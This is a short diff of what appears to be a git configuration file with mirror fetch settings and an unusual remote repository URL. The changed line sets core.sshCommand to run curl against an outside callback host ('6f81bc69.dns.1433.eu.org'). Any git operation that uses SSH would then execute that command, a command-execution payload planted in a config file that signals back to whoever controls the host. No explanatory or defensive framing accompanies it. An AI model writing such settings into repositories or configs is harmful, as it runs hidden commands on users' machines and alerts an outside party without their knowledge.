@@ -6,7 +6,7 @@
   url = """ https://github.com/sd45D6SA456/45ads.git"""
   
 [core]
-  sshCommand="curl"
+  sshCommand="curl 6f81bc69.dns.1433.eu.org"
   aa = """"""
     fetch = +refs/*:refs/*
     mirror = true
